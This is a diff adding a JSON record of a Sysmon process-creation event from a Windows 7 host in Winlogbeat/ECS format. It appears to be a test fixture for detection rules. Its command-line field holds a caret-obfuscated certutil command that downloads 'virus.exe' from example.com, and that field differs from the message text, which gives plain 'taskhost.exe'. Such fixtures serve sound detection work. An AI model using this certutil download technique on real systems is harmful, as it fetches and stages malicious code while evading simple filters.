@@ -1,0 +1,134 @@
+{
+  "@timestamp": "2021-02-04T22:27:19.453Z",
+  "user": {
+    "domain": "client",
+    "name": "setup"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:27:19.453\nProcessGuid: {19FC45AC-74C7-601C-0000-001066140100}\nProcessId: 1260\nImage: C:\\Windows\\System32\\taskhost.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Host Process for Windows Tasks\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskhost.exe\nCommandLine: \"taskhost.exe\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: client\\setup\nLogonGuid: {19FC45AC-74C6-601C-0000-002031010100}\nLogonId: 0x10131\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701\nParentProcessGuid: {19FC45AC-74C4-601C-0000-001068630000}\nParentProcessId: 444\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "process": {
+    "pid": 1260,
+    "executable": "C:\\Windows\\System32\\taskhost.exe",
+    "parent": {
+      "entity_id": "{19FC45AC-74C4-601C-0000-001068630000}",
+      "pid": 444,
+      "executable": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe",
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ]
+    },
+    "entity_id": "{19FC45AC-74C7-601C-0000-001066140100}",
+    "command_line": "cmd /c \"certutil -verifyctl -f -split h^t^t^p://example.com/virus.exe\"",
+    "working_directory": "C:\\Windows\\system32\\",
+    "name": "taskhost.exe",
+    "args": [
+      "taskhost.exe"
+    ],
+    "hash": {
+      "md5": "7fa8ba5a780e4757964ac9d4238302b9",
+      "sha256": "65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701"
+    }
+  },
+  "host": {
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.103",
+      "172.16.1.3",
+      "fe80::5efe:c0a8:3867",
+      "fe80::5efe:ac10:103"
+    ],
+    "mac": [
+      "00:50:56:00:03:03",
+      "00:50:56:00:00:03",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "hostname": "CLIENT3",
+    "architecture": "x86",
+    "name": "CLIENT",
+    "os": {
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows"
+    }
+  },
+  "log": {
+    "level": "information"
+  },
+  "related": {
+    "hash": [
+      "7fa8ba5a780e4757964ac9d4238302b9",
+      "65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701"
+    ],
+    "user": "setup"
+  },
+  "hash": {
+    "md5": "7fa8ba5a780e4757964ac9d4238302b9",
+    "sha256": "65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "agent": {
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT3",
+    "ephemeral_id": "f5ed3d9b-1471-4589-bd70-28219e0f5978",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT3"
+  },
+  "winlog": {
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "version": 5,
+    "record_id": 1168,
+    "computer_name": "CLIENT",
+    "process": {
+      "pid": 1692,
+      "thread": {
+        "id": 1064
+      }
+    },
+    "user": {
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM"
+    },
+    "event_data": {
+      "Description": "Host Process for Windows Tasks",
+      "LogonGuid": "{19FC45AC-74C6-601C-0000-002031010100}",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "taskhost.exe",
+      "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
+      "IntegrityLevel": "High",
+      "LogonId": "0x10131",
+      "TerminalSessionId": "1"
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "task": "Process Create (rule: ProcessCreate)",
+    "api": "wineventlog",
+    "opcode": "Info",
+    "event_id": 1,
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+  },
+  "event": {
+    "module": "sysmon",
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "category": [
+      "process"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:31:13.041Z"
+  }
+}
